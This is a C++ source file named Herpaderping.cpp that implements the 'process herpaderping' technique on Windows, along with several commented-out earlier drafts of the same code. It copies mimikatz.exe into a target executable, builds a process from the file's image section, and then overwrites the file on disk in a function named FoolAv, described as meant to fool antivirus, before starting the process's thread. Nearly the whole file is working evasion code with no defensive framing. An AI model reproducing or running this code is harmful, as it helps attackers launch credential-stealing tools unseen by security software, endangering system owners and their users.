// Author:  Nikj
// File:    Herpaderping.cpp

#include "pch.hpp"
#include "utilitaire.hpp"

std::wstring PayloadFile = L"C:\\Users\\Gshoo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe";
std::wstring TargetFile = L"test.exe";
constexpr static std::array<uint8_t, 22> Pattern{ '\x68', '\x65', '\x72', '\x70', '\x61', '\x64',
    '\x65', '\x72', '\x70', '\x69','\x6e', '\x67', '\x20', '\x69', '\x73', '\x20', '\x63', '\x6f', 
    '\x6f', '\x6f', '\x6f', '\x6c'
}; // herpaderping is cool


class Herpaderping
{
public:
    void start() 
    {
        std::cout << "Author: Nikj" << std::endl;
        std::cout << "Starting Herpaderping ..." << std::endl;

        Herpaderping::ReadPayload();
        Herpaderping::CreateTarget();
        Herpaderping::WritePayloadToTarget();
        Herpaderping::FoolAv();
        Herpaderping::CreatePayloadThreadFromTarget();
    }
private:
    wil::unique_handle hProcess;
    wil::unique_handle hProcessPayload;
    wil::unique_handle hProcessTarget;
    uint32_t imageEntryPointRva = 0;

    HRESULT ReadPayload() {
        hProcessPayload.reset(CreateFileW(PayloadFile.c_str(),
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        ));
        
        if (!hProcessPayload.is_valid())
        {
            std::cerr << "[!] - Failed to open the payload file" << std::endl;
        }

        return S_OK;
    }

    HRESULT CreateTarget() {
        hProcessTarget.reset(CreateFileW(TargetFile.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        ));
                                    
        if (!hProcessTarget.is_valid())
        {
            std::cerr << "[!] Failed to create the target file" << std::endl;
        }

        return S_OK;
    }

    HRESULT WritePayloadToTarget()
        {
            HRESULT HR = Utilitaire::CopyFileByHandle(hProcessPayload.get(), hProcessTarget.get());
            RETURN_IF_FAILED(HR);
                
            std::cout << "[+] Copy !! Mimikatz.exe To the target\n";
                
            // Free the payload process handle
            hProcessPayload.reset();
                 
            // Create Sections and the process of the target
            wil::unique_handle hSection;
                    
            auto status = NtCreateSection(&hSection,
                SECTION_ALL_ACCESS,
                nullptr,
                nullptr,
                PAGE_READONLY,
                SEC_IMAGE,
                hProcessTarget.get()
            );
                
            status = NtCreateProcessEx(&hProcess, 
                PROCESS_ALL_ACCESS, 
                nullptr, 
                NtCurrentProcess(), 
                PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
                hSection.get(), 
                nullptr, 
                nullptr, 
                0
            ); //Create a process with the section created above
                
            if (!NT_SUCCESS(status)) 
            {
                std::cerr << "[!] Unable to create process";
            }
            std::cout << "[+] Created process object, PID: " << GetProcessId(hProcess.get()) << "\n";
                
            // Free the handle section, we don't need anymore
            hSection.reset();
            
            // Get the RVA for the CreateThread
            HR = Utilitaire::GetImageEntryPointRva(hProcessTarget.get(), imageEntryPointRva);
            if (FAILED(HR))
            {
                std::cerr << "[!] Failed to get the RVA of the target process\n";
                RETURN_HR(HR);
            }

            std::cout << "[+] Located target image entry RVA 0x" << imageEntryPointRva << "\n";

            return S_OK;
        }
        
    HRESULT FoolAv()
    {
        // We overwrite the contents of the target file on disk to fool AV
        std::cout << "[+] Overwriting target with random pattern\n";
        
        HRESULT HR = Utilitaire::OverwriteFileContentsWithPattern(
            hProcessTarget.get(),
            Pattern,
            true // Flush File
        );
        
        if (FAILED(HR))
        {
            std::cerr << "[!] Failed to write pattern over file\n";
            RETURN_HR(HR);
        }
      
        return S_OK;
    }
        
    HRESULT CreatePayloadThreadFromTarget()
    {
        // We prepare the Target Process Thread to be executed
        std::cout << "[+] Preparing target for execution\n";

        PROCESS_BASIC_INFORMATION pbi{};
        auto status = NtQueryInformationProcess(hProcess.get(),
            ProcessBasicInformation,
            &pbi,
            sizeof(pbi),
            nullptr
        );
        if (!NT_SUCCESS(status))
        {
            std::cerr << "[!] Failed to query process information\n";
        }
        
        PEB peb{};
        if (!ReadProcessMemory(hProcess.get(),
            pbi.PebBaseAddress,
            &peb,
            sizeof(peb),
            nullptr))
        {
            std::cerr << "[!] Failed to read remote process PEB\n";
            exit(-1);
        }
        
        std::cout << "[+] Writing process parameters, remote PEB ProcessParameters " << Add2Ptr(pbi.PebBaseAddress, FIELD_OFFSET(PEB, ProcessParameters)) << "\n";
        
        HRESULT HR = Utilitaire::WriteRemoteProcessParameters(
            hProcess.get(),
            TargetFile,
            std::nullopt,
            std::nullopt,
            (L"\"" + TargetFile + L"\""),
            NtCurrentPeb()->ProcessParameters->Environment,
            TargetFile,
            L"WinSta0\\Default",
            std::nullopt,
            std::nullopt
        );
        RETURN_IF_FAILED(HR);
        
        hProcessTarget.reset();
        
        void* remoteEntryPoint = Add2Ptr(peb.ImageBaseAddress, imageEntryPointRva);
        
        // We execute the tread 
        wil::unique_handle threadHandle;
        status = NtCreateThreadEx(&threadHandle,
            THREAD_ALL_ACCESS,
            nullptr,
            hProcess.get(),
            remoteEntryPoint,
            nullptr,
            0,
            0,
            0,
            0,
            nullptr
        );  
        if (!NT_SUCCESS(status))    
        {
            threadHandle.release();
            std::cerr << "[!] Failed to create remote thread\n" << std::endl;
            RETURN_NTSTATUS(status);
        }
        
        std::cout << "[+] Created thread, TID:" << GetThreadId(threadHandle.get()) << std::endl;
        
        // Process target spawned, we wait for the exit to leave the program
        std::cout << "[+] Waiting for herpaderped process to exit" << std::endl;
        
        WaitForSingleObject(hProcess.get(), INFINITE);
        
        DWORD targetExitCode = 0;
        GetExitCodeProcess(hProcess.get(), &targetExitCode);
        
        std::cout << "[+] Herpaderped process exited with code 0x" << targetExitCode << std::endl;
        
        return S_OK;
    }
};

int main()
{
    Herpaderping herpaderping;
    herpaderping.start();
}
//namespace Herpaderping
//{
//    static wil::unique_handle hProcess;
//    static wil::unique_handle hProcessPayload;
//    static wil::unique_handle hProcessTarget;
//
//    HRESULT ReadPayload() {
//        //extern wil::unique_handle hProcessPayload;
//        hProcessPayload.reset(CreateFileW(PayloadFile.c_str(),
//            GENERIC_READ,
//            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
//            nullptr,
//            OPEN_EXISTING,
//            FILE_ATTRIBUTE_NORMAL,
//            nullptr
//        ));
//
//        if (!hProcessPayload.is_valid())
//        {
//            std::cerr << "[!] - Failed to open the payload file" << std::endl;
//        }
//        return S_OK;
//    }
//
//    HRESULT CreateTarget() {    
//        //extern wil::unique_handle hProcessTarget;
//        hProcessTarget.reset(CreateFileW(TargetFile.c_str(),
//            GENERIC_READ | GENERIC_WRITE,
//            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
//            nullptr,
//            CREATE_ALWAYS,
//            FILE_ATTRIBUTE_NORMAL,
//            nullptr
//        ));
//                            
//        if (!hProcessTarget.is_valid())
//        {
//            std::cerr << "[!] Failed to create the target file" << std::endl;
//        }
//        return S_OK;
//    }
//
//    HRESULT WritePayloadToTarget()
//    {
//        //extern wil::unique_handle hProcess;
//
//        HRESULT HR = Utilitaire::CopyFileByHandle(Herpaderping::hProcessPayload.get(), Herpaderping::hProcessTarget.get());
//        RETURN_IF_FAILED(HR);
//        
//        std::cout << "[+] Copy !! Mimikatz.exe To the target\n";
//        
//        // Free the payload process handle
//        //hProcessPayload.reset();
//         
//        // Create Sections and the process of the target
//        wil::unique_handle hSection;
//            
//        auto status = NtCreateSection(&hSection,
//            SECTION_ALL_ACCESS,
//            nullptr,
//            nullptr,
//            PAGE_READONLY,
//            SEC_IMAGE,
//            Herpaderping::hProcessTarget.get()
//        );
//        
//        status = NtCreateProcessEx(&Herpaderping::hProcess, 
//            PROCESS_ALL_ACCESS, 
//            nullptr, 
//            NtCurrentProcess(), 
//            PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
//            hSection.get(), 
//            nullptr, 
//            nullptr, 
//            0
//        ); //Create a process with the section created above
//        
//        if (!NT_SUCCESS(status)) 
//        {
//            std::cerr << "[!] Unable to create process";
//        }
//        std::cout << "[+] Created process object, PID %lu" << GetProcessId(Herpaderping::hProcess.get()) << "\n";
//        
//        // Free the handle section, we don't need anymore
//        hSection.reset();
//        
//        return S_OK;
//    }
//
//    HRESULT FoolAv()
//    {
//        // We overwrite the contents of the target file on disk to fool AV
//        std::cout << "[+] Overwriting target with random pattern\n";
//
//        HRESULT HR = Utilitaire::OverwriteFileContentsWithPattern(
//            Herpaderping::hProcessTarget.get(),
//            Pattern,
//            true // Flush File
//        );
//
//        if (FAILED(HR))
//        {
//            std::cerr << "[!] Failed to write pattern over file\n";
//            RETURN_HR(HR);
//        }
//        
//        return S_OK;
//    }
//
//    HRESULT CreatePayloadThreadFromTarget()
//    {
//        // Get the RVA for the CreateThread
//        uint32_t imageEntryPointRva = 0;
//        HRESULT HR = Utilitaire::GetImageEntryPointRva(Herpaderping::hProcessTarget.get(), imageEntryPointRva);
//        if (FAILED(HR))
//        {
//            std::cerr << "[!] Failed to get the RVA of the target process";
//            RETURN_HR(HR);
//        }
//        //RETURN_IF_FAILED(HR);
//
//        std::cout << "[+] Located target image entry RVA 0x" << imageEntryPointRva << "\n";
//
//        // We prepare the Target Process Thread to be executed
//        std::cout << "[+] Preparing target for execution\n";
//
//        PROCESS_BASIC_INFORMATION pbi{};
//        auto status = NtQueryInformationProcess(Herpaderping::hProcess.get(),
//            ProcessBasicInformation,
//            &pbi,
//            sizeof(pbi),
//            nullptr
//        );
//        if (!NT_SUCCESS(status))
//        {
//            std::cerr << "[!] Failed to query process information\n";
//        }
//
//        PEB peb{};
//        if (!ReadProcessMemory(Herpaderping::hProcess.get(),
//            pbi.PebBaseAddress,
//            &peb,
//            sizeof(peb),
//            nullptr))
//        {
//            std::cerr << "[!] Failed to read remote process PEB\n";
//            exit(-1);
//        }
//
//        std::cout << "[+] Writing process parameters, remote PEB ProcessParameters " << Add2Ptr(pbi.PebBaseAddress, FIELD_OFFSET(PEB, ProcessParameters)) << "\n";
//
//        HR = Utilitaire::WriteRemoteProcessParameters(
//            Herpaderping::hProcess.get(),
//            TargetFile,
//            std::nullopt,
//            std::nullopt,
//            (L"\"" + TargetFile + L"\""),
//            NtCurrentPeb()->ProcessParameters->Environment,
//            TargetFile,
//            L"WinSta0\\Default",
//            std::nullopt,
//            std::nullopt
//        );
//        RETURN_IF_FAILED(HR);
//
//        Herpaderping::hProcessTarget.reset();
//
//        void* remoteEntryPoint = Add2Ptr(peb.ImageBaseAddress, imageEntryPointRva);
//
//        // We execute the tread 
//        wil::unique_handle threadHandle;
//        status = NtCreateThreadEx(&threadHandle,
//            THREAD_ALL_ACCESS,
//            nullptr,
//            Herpaderping::hProcess.get(),
//            remoteEntryPoint,
//            nullptr,
//            0,
//            0,
//            0,
//            0,
//            nullptr
//        );  
//        if (!NT_SUCCESS(status))    
//        {
//            threadHandle.release();
//            std::cerr << "[!] Failed to create remote thread\n";
//            std::cerr << GetLastError() << "\n";
//            std::cerr << status << "\n";
//            RETURN_NTSTATUS(status);
//        }
//
//        std::cout << "[+] Created thread, TID:" << GetThreadId(threadHandle.get()) << "\n";
//
//
//        // Process target spawned, we wait for the exit to leave the program
//        std::cout << "[+] Waiting for herpaderped process to exit";
//
//        WaitForSingleObject(Herpaderping::hProcess.get(), INFINITE);
//
//        DWORD targetExitCode = 0;
//        GetExitCodeProcess(Herpaderping::hProcess.get(), &targetExitCode);
//
//        std::cout << "Herpaderped process exited with code 0x" << targetExitCode;
//
//        return S_OK;
//    }
//}
//
//int main()
//{   
//    Herpaderping::ReadPayload();
//    Herpaderping::CreateTarget();
//    Herpaderping::WritePayloadToTarget();
//    Herpaderping::FoolAv();
//    Herpaderping::CreatePayloadThreadFromTarget();
//    return 0;
//}



//int main()
//{
//    // Init Variables
//    wil::unique_handle hProcess;
//    wil::unique_handle hProcessPayload;
//    wil::unique_handle hProcessTarget;
//
//    // If an error happen we exit the process
//    auto terminateProcess = wil::scope_exit([&hProcess]() -> void
//    {
//        if (hProcess.is_valid())
//        {
//            TerminateProcess(hProcess.get(), 0);
//        }
//    });
//
//    // Read the payload File
//    hProcessPayload.reset(CreateFileW(PayloadFile.c_str(),
//		GENERIC_READ,
//		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
//		nullptr,
//		OPEN_EXISTING,
//		FILE_ATTRIBUTE_NORMAL,
//		nullptr
//	));
//
//	if (!hProcessPayload.is_valid())
//	{
//		std::cerr << "[!] - Failed to open the payload file" << std::endl;
//	}
//
//    // Create the payload file
//    hProcessTarget.reset(CreateFileW(TargetFile.c_str(),
//        GENERIC_READ | GENERIC_WRITE,
//        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
//        nullptr,
//        CREATE_ALWAYS,
//        FILE_ATTRIBUTE_NORMAL,
//        nullptr
//    ));
//
//    if (!hProcessTarget.is_valid())
//    {
//        std::cerr << "[!] Failed to create the target file" << std::endl;
//    }
//
//    // Write the payload to the target file
//    HRESULT HR = Utilitaire::CopyFileByHandle(hProcessPayload.get(), hProcessTarget.get());
//    RETURN_IF_FAILED(HR);
//
//    std::cout << "[+] Copy !! Mimikatz.exe To the target\n";
//
//    // Free the payload process handle
//    hProcessPayload.reset();
// 
//    // Create Sections and the process of the target
//    wil::unique_handle hSection;
//    
//    auto status = NtCreateSection(&hSection,
//        SECTION_ALL_ACCESS,
//        nullptr,
//        nullptr,
//        PAGE_READONLY,
//        SEC_IMAGE,
//        hProcessTarget.get()
//    );
//
//    status = NtCreateProcessEx(&hProcess, 
//        PROCESS_ALL_ACCESS, 
//        nullptr, 
//        NtCurrentProcess(), 
//        PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
//        hSection.get(), 
//        nullptr, 
//        nullptr, 
//        0
//    ); //Create a process with the section created above
//
//    if (!NT_SUCCESS(status)) 
//    {
//        std::cerr << "[!] Unable to create process";
//    }
//    std::cout << "[+] Created process object, PID %lu" << GetProcessId(hProcess.get()) << "\n";
//
//    // Free the handle section, we don't need anymore
//    hSection.reset();
//
//    // Get the RVA for the CreateThread
//    uint32_t imageEntryPointRva = 0;
//    HR = Utilitaire::GetImageEntryPointRva(hProcessTarget.get(), imageEntryPointRva);
//    RETURN_IF_FAILED(HR);
//
//    std::cout << "[+] Located target image entry RVA 0x" << imageEntryPointRva << "\n";
//
//    // We overwrite the contents of the target file on disk to fool AV
//    std::cout << "[+] Overwriting target with random pattern\n";
//
//    HR = Utilitaire::OverwriteFileContentsWithPattern(
//        hProcessTarget.get(),
//        Pattern,
//        true // Flush File
//    );
//
//    if (FAILED(HR))
//    {
//        std::cerr << "[!] Failed to write pattern over file\n";
//        RETURN_HR(HR);
//    }
//    //
//
//    // We prepare the Target Process Thread to be executed
//    std::cout << "[+] Preparing target for execution\n";
//
//    PROCESS_BASIC_INFORMATION pbi{};
//    status = NtQueryInformationProcess(hProcess.get(),
//        ProcessBasicInformation,
//        &pbi,
//        sizeof(pbi),
//        nullptr
//    );
//    if (!NT_SUCCESS(status))
//    {
//        std::cerr << "[!] Failed to query process information\n";
//    }
//
//    PEB peb{};
//    if (!ReadProcessMemory(hProcess.get(),
//        pbi.PebBaseAddress,
//        &peb,
//        sizeof(peb),
//        nullptr))
//    {
//        std::cerr << "[!] Failed to read remote process PEB\n";
//        exit(-1);
//    }
//
//    std::cout << "[+] Writing process parameters, remote PEB ProcessParameters " << Add2Ptr(pbi.PebBaseAddress, FIELD_OFFSET(PEB, ProcessParameters)) << "\n";
//
//    HR = Utilitaire::WriteRemoteProcessParameters(
//        hProcess.get(),
//        TargetFile,
//        std::nullopt,
//        std::nullopt,
//        (L"\"" + TargetFile + L"\""),
//        NtCurrentPeb()->ProcessParameters->Environment,
//        TargetFile,
//        L"WinSta0\\Default",
//        std::nullopt,
//        std::nullopt
//    );
//    RETURN_IF_FAILED(HR);
//
//    //hProcessTarget.reset();
//
//    void* remoteEntryPoint = Add2Ptr(peb.ImageBaseAddress, imageEntryPointRva);
//    //const PIMAGE_DOS_HEADER payload_dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(source_file_payload.get()->data());
//    //const PIMAGE_NT_HEADERS64 payload_nt_header = reinterpret_cast<PIMAGE_NT_HEADERS64>(source_file_payload.get()->data() + payload_dos_header->e_lfanew);
//
//    ////std::cout << "[+] Creating thread in process at entry point 0x" << remoteEntryPoint << "\n";
//    //ULONGLONG entry_point = peb.ImageBaseAddress + payload_nt_header->OptionalHeader.AddressOfEntryPoint;
//
//    // We execute the tread 
//    wil::unique_handle threadHandle;
//    status = NtCreateThreadEx(&threadHandle,
//        THREAD_ALL_ACCESS,
//        nullptr,
//        hProcess.get(),
//        remoteEntryPoint,
//        nullptr,
//        0,
//        0,
//        0,
//        0,
//        nullptr
//    );  
//    if (!NT_SUCCESS(status))    
//    {
//        threadHandle.release();
//        std::cerr << "[!] Failed to create remote thread\n";
//        std::cerr << GetLastError() << "\n";
//        std::cerr << status << "\n";
//        RETURN_NTSTATUS(status);
//    }
//
//    std::cout << "[+] Created thread, TID:" << GetThreadId(threadHandle.get()) << "\n";
//    
//    //
//
//    // Process target spawned, we wait for the exit to leave the program
//    std::cout << "[+] Waiting for herpaderped process to exit";
//
//    WaitForSingleObject(hProcess.get(), INFINITE);
//
//    DWORD targetExitCode = 0;
//    GetExitCodeProcess(hProcess.get(), &targetExitCode);
//
//    std::cout << "Herpaderped process exited with code 0x" << targetExitCode;
//
//    return 0;
//}



//namespace Herpaderping 
//{
//    wil::unique_handle hProcessPayload;
//    wil::unique_handle hProcessTarget;
//    wil::unique_handle hProcess;
//
//    std::wstring TargetFileName = L"herpaderp.exe";
//
//    // Generate Random Bytes to mitigate the future target process -> fooling AV
//    std::span<const uint8_t> pattern = Pattern;
//    std::vector<uint8_t> patternBuffer;
//
//    HRESULT ReadPayload() {
//        //wil::unique_handle hProcessPayload;
//        //LPCSTR PaintPath = "C:\\WINDOWS\\system32\\mspaint.exe"; // mspaint.exe
//        std::wstring PayloadPath = L"C:\\WINDOWS\\system32\\mspaint.exe";
//        //std::wstring PayloadPath = L"C:\\Users\\Gshoo\\Downloads\\mimikatz_exe\\x64\\mimikatz.exe";
//
//        hProcessPayload.reset(CreateFileW(PayloadPath.c_str(),
//            GENERIC_READ,
//            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
//            nullptr,
//            OPEN_EXISTING,
//            FILE_ATTRIBUTE_NORMAL,
//            nullptr
//        ));
//        if (!hProcessPayload.is_valid())
//        {
//            std::cerr << "[!] - Failed to open the payload file" << std::endl;
//        }
//        return S_OK;
//    }
//
//    HRESULT CreateTarget() {
//        /*wil::unique_handle hProcessTarget;*/
//        //std::wstring TargetFileName = L"herpaderp.exe";
//                    
//        hProcessTarget.reset(CreateFileW(TargetFileName.c_str(),
//            GENERIC_READ | GENERIC_WRITE,
//            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
//            nullptr,
//            CREATE_ALWAYS,
//            FILE_ATTRIBUTE_NORMAL,
//            nullptr
//        ));
//                    
//        if (!hProcessTarget.is_valid())
//        {
//            std::cerr << "[!] Failed to create the target file" << std::endl;
//        }
//        return S_OK;
//    }
//        
//    HRESULT WritePayloadToTarget() 
//    {
//        HRESULT HR = Utilitaire::CopyFileWithHandle(hProcessPayload.get(), hProcessTarget.get());
//        return S_OK;
//    }
//
//    HRESULT CreateTargetProcess()
//    {
//        wil::unique_handle hSection;
//
//        auto status = NtCreateSection(&hSection,
//            SECTION_ALL_ACCESS,
//            nullptr,
//            nullptr,
//            PAGE_READONLY,
//            SEC_IMAGE,
//            hProcessTarget.get()
//        );
//
//        status = NtCreateProcessEx(&hProcess,
//            PROCESS_ALL_ACCESS,
//            nullptr,
//            NtCurrentProcess(),
//            PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
//            hSection.get(),
//            nullptr,
//            nullptr,
//            0
//        ); //Create a process with the section created above
//
//        if (!NT_SUCCESS(status))
//        {
//            std::cerr << "[!] Unable to create process";
//        }
//        std::cout << "[+] Created process object, PID:" << GetProcessId(hProcess.get()) << "\n";
//
//        // Free the handle section, we don't need anymore
//        hSection.reset();
//
//        return S_OK;
//    }
//
//    HRESULT MitigateTargetFile()
//    {
//        patternBuffer.resize(RandPatterLen);
//        HRESULT HR = Utilitaire::FillBufferWithRandomBytes(patternBuffer);
//        if (FAILED(HR))
//        {
//            std::cerr << "[!] Failed to generate random buffer\n";
//            return EXIT_FAILURE;
//        }
//        pattern = std::span<const uint8_t>(patternBuffer);
//
//        HR = Utilitaire::OverwriteFileContentsWithPattern(
//            hProcessTarget.get(),
//            Pattern,
//            true // Flush File
//        );
//        if (FAILED(HR))
//        {
//            std::cerr << "[!] Failed to write pattern over file\n";
//            RETURN_HR(HR);
//        }
//        return S_OK;
//    }
//
//    HRESULT CreateTargetThread()
//    {
//        std::cout << "test1\n";
//
//        // Get the RVA for the CreateThread
//        uint32_t imageEntryPointRva = 0;
//        HRESULT HR = Utilitaire::GetImageEntryPointRva(hProcessTarget.get(), imageEntryPointRva);
//        RETURN_IF_FAILED(HR);
//
//        std::cout << "test2\n";
//
//        PROCESS_BASIC_INFORMATION pbi{};
//        auto status = NtQueryInformationProcess(hProcess.get(),
//            ProcessBasicInformation,
//            &pbi,
//            sizeof(pbi),
//            nullptr
//        );
//        if (!NT_SUCCESS(status))
//        {
//            std::cerr << "[!] Failed to query process information\n";
//        }
//        
//        PEB peb{};
//        if (!ReadProcessMemory(hProcess.get(),
//            pbi.PebBaseAddress,
//            &peb,
//            sizeof(peb),
//            nullptr))
//        {
//            std::cerr << "[!] Failed to read remote process PEB\n";
//            exit(-1);
//        }
//        
//        std::cout << "[+] Writing process parameters, remote PEB ProcessParameters " << Add2Ptr(pbi.PebBaseAddress, FIELD_OFFSET(PEB, ProcessParameters)) << "\n";
//        
//        HR = Utilitaire::WriteRemoteProcessParameters(
//            hProcess.get(),
//            TargetFileName,
//            std::nullopt,
//            std::nullopt,
//            (L"\"" + TargetFileName + L"\""),
//            NtCurrentPeb()->ProcessParameters->Environment,
//            TargetFileName,
//            L"WinSta0\\Default",
//            std::nullopt,
//            std::nullopt
//        );
//        RETURN_IF_FAILED(HR);
//
//        void* remoteEntryPoint = Add2Ptr(peb.ImageBaseAddress, imageEntryPointRva);
//        //const PIMAGE_DOS_HEADER payload_dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(source_file_payload.get()->data());
//        //const PIMAGE_NT_HEADERS64 payload_nt_header = reinterpret_cast<PIMAGE_NT_HEADERS64>(source_file_payload.get()->data() + payload_dos_header->e_lfanew);
//        
//        ////std::cout << "[+] Creating thread in process at entry point 0x" << remoteEntryPoint << "\n";
//        //ULONGLONG entry_point = peb.ImageBaseAddress + payload_nt_header->OptionalHeader.AddressOfEntryPoint;
//        
//        // We execute the tread 
//        wil::unique_handle threadHandle;
//        status = NtCreateThreadEx(&threadHandle,
//            THREAD_ALL_ACCESS,
//            nullptr,
//            hProcess.get(),
//            remoteEntryPoint,
//            nullptr,
//            0,
//            0,
//            0,
//            0,
//            nullptr
//        );  
//        if (!NT_SUCCESS(status))    
//        {
//            threadHandle.release();
//            std::cerr << "[!] Failed to create remote thread\n";
//            std::cerr << GetLastError() << "\n";
//            std::cerr << status << "\n";
//            RETURN_NTSTATUS(status);
//        }
//        
//        std::cout << "[+] Created thread, TID:" << GetThreadId(threadHandle.get()) << "\n";
//
//        return S_OK;
//    }
//}